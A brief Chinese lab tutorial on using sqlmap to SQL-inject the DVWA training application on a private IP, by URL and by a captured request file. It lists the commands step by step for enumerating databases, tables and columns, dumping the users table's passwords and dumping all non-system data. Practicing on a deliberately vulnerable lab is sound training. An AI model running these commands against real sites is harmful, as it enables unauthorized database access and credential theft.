# 使用访问URL方法SQL注入该网站

> 获取除系统默认表外的所有数据 --dump-all --exclude-sysdbs

①判断注入点和数据类型

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1

判断数据库名（--current-db可判断当前数据库名）

 sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 --dbs 

判断表名

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa --tables

判断列名

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa -T users --column

获取字段

sqlmap -u http://192.168.140.134/dvwa/vulnerabilities/sqli/?id=1 -D dvwa -T users -C password --dump

#  使用加载外部文件方法注入该网站

先抓包，然后保存为url.txt

然后再执行sqlmap -r /etc/url.txt

判断数据库名sqlmap -r /etc/url.txt --dbs

判断表名sqlmap -r /etc/url.txt -D dvwa --tables

判断列名sqlmap -r /etc/url.txt -D dvwa -T users --column

获取具体字段名：如上图中的users表的password列

sqlmap -r /etc/url.txt -D dvwa -T users -C password --dump

获取除系统默认表外的所有数据 sqlmap -r /etc/url.txt --dump-all --exclude-sysdbs

